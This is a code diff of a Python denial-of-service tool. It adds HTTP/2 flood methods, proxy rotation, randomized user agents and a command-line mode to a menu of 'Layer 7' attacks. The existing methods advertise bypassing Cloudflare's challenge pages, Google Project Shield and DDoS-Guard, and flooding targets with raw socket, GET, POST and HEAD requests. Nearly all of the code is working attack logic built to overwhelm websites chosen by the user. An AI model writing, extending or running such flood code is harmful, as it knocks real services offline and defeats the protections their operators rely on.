@@ -1,12 +1,11 @@
 # -*- coding: utf-8 -*-
 from os import system, name
-import os, threading, requests, cloudscraper, datetime, time, socket, socks, ssl, random
+import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx
 from urllib.parse import urlparse
 from requests.cookies import RequestsCookieJar
 import undetected_chromedriver as webdriver
 from sys import stdout
 from colorama import Fore, init
-init(convert=True)
 
 def countdown(t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
@@ -239,7 +238,7 @@ def LaunchPXSOC(url, th, t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     req =  "GET " +target['uri'] + " HTTP/1.1\r\n"
     req += "Host: " + target['host'] + "\r\n"
-    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
+    req += "User-Agent: " + random.choice(ua) + "\r\n"
     req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
     req += "Connection: Keep-Alive\r\n\r\n"
     for _ in range(int(th)):
@@ -278,7 +277,7 @@ def LaunchSOC(url, th, t):
     target = get_target(url)
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
     req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
-    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
+    req += "User-Agent: " + random.choice(ua) + "\r\n"
     req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
     req += "Connection: Keep-Alive\r\n\r\n"
     for _ in range(int(th)):
@@ -443,12 +442,11 @@ def attackSKY(url, timer, threads):
         threading.Thread(target=LaunchSKY, args=(url, timer)).start()
 
 def LaunchSKY(url, timer):
-    prox = open("./socks.txt", 'r').read().split('\n')
-    proxy = random.choice(prox).strip().split(":")
+    proxy = random.choice(proxies).strip().split(":")
     timelol = time.time() + int(timer)
     req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
     req += "Cache-Control: no-cache\r\n"
-    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
+    req += "User-Agent: " + random.choice(ua) + "\r\n"
     req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
     req += "Sec-Fetch-Site: same-origin\r\n"
     req += "Sec-GPC: 1\r\n"
@@ -465,7 +463,7 @@ def LaunchSKY(url, timer):
             s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
             s.send(str.encode(req))
             try:
-                for i in range(100):
+                for _ in range(100):
                     s.send(str.encode(req))
                     s.send(str.encode(req))
             except:
@@ -481,7 +479,7 @@ def LaunchSTELLAR(url, timer):
     timelol = time.time() + int(timer)
     req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
     req += "Cache-Control: no-cache\r\n"
-    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
+    req += "User-Agent: " + random.choice(ua) + "\r\n"
     req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
     req += "Sec-Fetch-Site: same-origin\r\n"
     req += "Sec-GPC: 1\r\n"
@@ -493,11 +491,11 @@ def LaunchSTELLAR(url, timer):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((str(urlparse(url).netloc), int(443)))
-            ctx = ssl.SSLContext()
+            ctx = ssl.create_default_context()
             s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
             s.send(str.encode(req))
             try:
-                for i in range(80000):
+                for _ in range(100):
                     s.send(str.encode(req))
                     s.send(str.encode(req))
             except:
@@ -505,6 +503,115 @@ def LaunchSTELLAR(url, timer):
         except:
             s.close()
 #endregion
+
+def LaunchHTTP2(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    for _ in range(int(th)):
+        threading.Thread(target=AttackHTTP2, args=(url, until)).start()
+
+def AttackHTTP2(url, until_datetime):
+    headers = {
+            'User-Agent': random.choice(ua),
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'TE': 'trailers',
+            }
+    client = httpx.Client(http2=True)
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            client.get(url, headers=headers)
+            client.get(url, headers=headers)
+        except:
+            pass
+
+def LaunchPXHTTP2(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    for _ in range(int(th)):
+        threading.Thread(target=AttackHTTP2, args=(url, until)).start()
+
+def AttackPXHTTP2(url, until_datetime):
+    headers = {
+            'User-Agent': random.choice(ua),
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
+            'Cache-Control': 'no-cache',
+            'Pragma': 'no-cache',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'same-origin',
+            'Sec-Fetch-User': '?1',
+            'TE': 'trailers',
+            }
+    
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            client = httpx.Client(
+                http2=True,
+                proxies={
+                    'http://': 'http://'+random.choice(proxies),
+                    'https://': 'http://'+random.choice(proxies),
+                }
+             )
+            client.get(url, headers=headers)
+            client.get(url, headers=headers)
+        except:
+            pass
+
+def test1(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    target = get_target(url)
+    req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
+    req += 'Host: ' + target['host'] + '\r\n'
+    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
+    req += 'Accept-Encoding: gzip, deflate, br\r\n'
+    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
+    req += 'Cache-Control: max-age=0\r\n'
+    #req += 'Cookie: ' + cookie + '\r\n'
+    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
+    req += 'sec-ch-ua-mobile: ?0\r\n'
+    req += 'sec-ch-ua-platform: "Windows"\r\n'
+    req += 'sec-fetch-dest: empty\r\n'
+    req += 'sec-fetch-mode: cors\r\n'
+    req += 'sec-fetch-site: same-origin\r\n'
+    req += 'Connection: Keep-Alive\r\n'
+    req += 'User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en\r\n\r\n\r\n'
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=test2,args=(until, target, req,))
+            thd.start()
+        except:  
+            pass
+
+def test2(until_datetime, target, req):
+    if target['scheme'] == 'https':
+        packet = socks.socksocket()
+        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        packet.connect((str(target['host']), int(target['port'])))
+        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
+    else:
+        packet = socks.socksocket()
+        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        packet.connect((str(target['host']), int(target['port'])))
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            for _ in range(10):
+                packet.send(str.encode(req))
+        except:
+            packet.close()
+            pass
+
 
 #endregion
 
@@ -515,7 +622,7 @@ def clear():
         system('clear')
 ##############################################################################################
 def help():
-    clear()    
+    clear()
     stdout.write("                                                                                         \n")
     stdout.write("                                 "+Fore.LIGHTWHITE_EX   +"  ╦ ╦╔═╗╦  ╔═╗             \n")
     stdout.write("                                 "+Fore.LIGHTCYAN_EX    +"  ╠═╣║╣ ║  ╠═╝             \n")
@@ -549,25 +656,24 @@ def layer7():
     stdout.write("                                 "+Fore.LIGHTCYAN_EX    +"║  ╠═╣╚╦╝║╣ ╠╦╝  ╔╝             \n")
     stdout.write("                                 "+Fore.LIGHTCYAN_EX    +"╩═╝╩ ╩ ╩ ╚═╝╩╚═  ╩              \n")
     stdout.write("             "+Fore.LIGHTCYAN_EX            +"        ══╦═════════════════════════════════╦══\n")
-    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╔═════════╩═════════════════════════════════╩═════════╗\n")
-    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"cfb   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Bypass CF Attack                          "+Fore.LIGHTCYAN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxcfb "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Bypass CF Attack With Proxy               "+Fore.LIGHTCYAN_EX+"║\n")                  
-    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"cfpro "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Bypass CF UAM, CAPTCHA, BFM (request)     "+Fore.LIGHTCYAN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"cfsoc "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Bypass CF UAM, CAPTCHA, BFM (socket)      "+Fore.LIGHTCYAN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"bypass"+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Bypass Google Project Shield, Vshield,    "+Fore.LIGHTCYAN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m  "+Fore.LIGHTWHITE_EX+"      "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" DDoS Guard Free, CF NoSec                 "+Fore.LIGHTCYAN_EX+"║\n")
-    
-    
-    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"get   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Get Request Attack                        "+Fore.LIGHTCYAN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"post  "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Post Request Attack                       "+Fore.LIGHTCYAN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"head  "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Head Request Attack                       "+Fore.LIGHTCYAN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"http2 "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" HTTP 2.0 Request Attack                   "+Fore.LIGHTCYAN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"spoof "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" HTTP Spoof Socket Attack                  "+Fore.LIGHTCYAN_EX+"║\n")
-
-    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"soc   "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Socket Attack                             "+Fore.LIGHTCYAN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxraw "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Proxy Request Attack                      "+Fore.LIGHTCYAN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxsoc "+Fore.LIGHTCYAN_EX+"|"+Fore.LIGHTWHITE_EX+" Proxy Socket Attack                       "+Fore.LIGHTCYAN_EX+"║\n")
-    stdout.write("             "+Fore.LIGHTCYAN_EX            +"╚═════════════════════════════════════════════════════╝\n") 
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"╔══════════╩═════════════════════════════════╩═════════╗\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"cfb    "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass CF Attack                         "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxcfb  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass CF Attack With Proxy              "+Fore.LIGHTCYAN_EX+"║\n")                  
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"cfreq  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass CF UAM, CAPTCHA, BFM (request)    "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"cfsoc  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass CF UAM, CAPTCHA, BFM (socket)     "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxsky  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Bypass Google Project Shield, Vshield,   "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m  "+Fore.LIGHTWHITE_EX+"       "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" DDoS Guard Free, CF NoSec With Proxy     "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"sky    "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Sky method without proxy                 "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"http2  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" HTTP 2.0 Request Attack                  "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxhttp2"+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" HTTP 2.0 Request Attack With Proxy       "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"get    "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Get Request Attack                       "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"post   "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Post Request Attack                      "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"head   "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Head Request Attack                      "+Fore.LIGHTCYAN_EX+"║\n")
+#    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"spoof  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" HTTP Spoof Socket Attack                 "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"soc    "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Socket Attack                            "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxraw  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Proxy Request Attack                     "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"pxsoc  "+Fore.LIGHTCYAN_EX+" |"+Fore.LIGHTWHITE_EX+" Proxy Socket Attack                      "+Fore.LIGHTCYAN_EX+"║\n")
+    stdout.write("            "+Fore.LIGHTCYAN_EX            +"╚══════════════════════════════════════════════════════╝\n") 
     stdout.write("\n")
 ##############################################################################################
 def layer4():
@@ -630,8 +736,21 @@ def command():
         exit()
     elif command == "test":
         target, thread, t = get_info_l7()
-        Launch(target, thread, t, "HEAD")
+        test1(target, thread, t)
         time.sleep(10)
+    elif command == "http2" or command == "HTTP2":
+        target, thread, t = get_info_l7()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchHTTP2(target, thread, t)
+        timer.join()
+    elif command == "pxhttp2" or command == "PXHTTP2":
+        if get_proxies():
+            target, thread, t = get_info_l7()
+            timer = threading.Thread(target=countdown, args=(t,))
+            timer.start()
+            LaunchPXHTTP2(target, thread, t)
+            timer.join()
     elif command == "cfb" or command == "CFB":
         target, thread, t = get_info_l7()
         timer = threading.Thread(target=countdown, args=(t,))
@@ -683,7 +802,7 @@ def command():
             timer.start()
             LaunchPXSOC(target, thread, t)
             timer.join()
-    elif command == "cfpro" or command == "CFPRO":
+    elif command == "cfreq" or command == "CFREQ":
         target, thread, t = get_info_l7()
         stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
         if get_cookie(target):
@@ -703,13 +822,14 @@ def command():
             timer.join()
         else:
             stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
-    elif command == "sky":
-        target, thread, t = get_info_l7()
-        threading.Thread(target=attackSKY, args=(target, t, thread)).start()
-        timer = threading.Thread(target=countdown, args=(t,))
-        timer.start()
-        timer.join()
-    elif command == "stellar":
+    elif command == "pxsky" or command == "PXSKY":
+        if get_proxies():
+            target, thread, t = get_info_l7()
+            threading.Thread(target=attackSKY, args=(target, t, thread)).start()
+            timer = threading.Thread(target=countdown, args=(t,))
+            timer.start()
+            timer.join()
+    elif command == "sky" or command == "SKY":
         target, thread, t = get_info_l7()
         threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
         timer = threading.Thread(target=countdown, args=(t,))
@@ -790,9 +910,110 @@ def func():
     stdout.write(Fore.MAGENTA+" • "+Fore.WHITE+"credit     "+Fore.RED+": "+Fore.WHITE+"Thanks for\n")
 
 if __name__ == '__main__':
-    clear()
-    title()
-    while True:
-        command()
-
-                               
+    init(convert=True)
+    if len(sys.argv) < 2:
+        ua = open('./resources/ua.txt', 'r').read().split('\n')
+        clear()
+        title()
+        while True:
+            command()
+    elif len(sys.argv) == 5:
+        pass
+    else:
+        stdout.write("Method: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc\n")
+        stdout.write(f"usage:~# python3 {sys.argv[0]} <method> <target> <thread> <time>\n")
+        sys.exit()
+    ua = open('./resources/ua.txt', 'r').read().split('\n')
+    method = sys.argv[1].rstrip()
+    target = sys.argv[2].rstrip()
+    thread = sys.argv[3].rstrip()
+    t      = sys.argv[4].rstrip()
+    if method == "cfb":
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchCFB(target, thread, t)
+        timer.join()
+    elif method == "pxcfb":
+        if get_proxies():
+            timer = threading.Thread(target=countdown, args=(t,))
+            timer.start()
+            LaunchPXCFB(target, thread, t)
+            timer.join()
+    elif method == "get":
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchRAW(target, thread, t)
+        timer.join()
+    elif method == "post":
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchPOST(target, thread, t)
+        timer.join()
+    elif method == "head":
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchHEAD(target, thread, t)
+        timer.join()
+    elif method == "pxraw":
+        if get_proxies():
+            timer = threading.Thread(target=countdown, args=(t,))
+            timer.start()
+            LaunchPXRAW(target, thread, t)
+            timer.join()
+    elif method == "soc":
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchSOC(target, thread, t)
+        timer.join()
+    elif method == "pxsoc":
+        if get_proxies():
+            timer = threading.Thread(target=countdown, args=(t,))
+            timer.start()
+            LaunchPXSOC(target, thread, t)
+            timer.join()
+    elif method == "cfreq":
+        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
+        if get_cookie(target):
+            timer = threading.Thread(target=countdown, args=(t,))
+            timer.start()
+            LaunchCFPRO(target, thread, t)
+            timer.join()
+        else:
+            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
+    elif method == "cfsoc":
+        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Bypassing CF... (Max 60s)\n")
+        if get_cookie(target):
+            timer = threading.Thread(target=countdown, args=(t,))
+            timer.start()
+            LaunchCFSOC(target, thread, t)
+            timer.join()
+        else:
+            stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Failed to bypass cf\n")
+    elif method == "http2":
+        target, thread, t = get_info_l7()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        LaunchHTTP2(target, thread, t)
+        timer.join()
+    elif method == "pxhttp2":
+        if get_proxies():
+            target, thread, t = get_info_l7()
+            timer = threading.Thread(target=countdown, args=(t,))
+            timer.start()
+            LaunchPXHTTP2(target, thread, t)
+            timer.join()
+    elif method == "pxsky":
+        if get_proxies():
+            target, thread, t = get_info_l7()
+            threading.Thread(target=attackSKY, args=(target, t, thread)).start()
+            timer = threading.Thread(target=countdown, args=(t,))
+            timer.start()
+            timer.join()
+    elif method == "sky":
+        target, thread, t = get_info_l7()
+        threading.Thread(target=attackSTELLAR, args=(target, t, thread)).start()
+        timer = threading.Thread(target=countdown, args=(t,))
+        timer.start()
+        timer.join()
+    else:
+        stdout.write("No method found.\nMethod: cfb, pxcfb, cfreq, cfsoc, pxsky, sky, http2, pxhttp2, get, post, head, soc, pxraw, pxsoc\n")
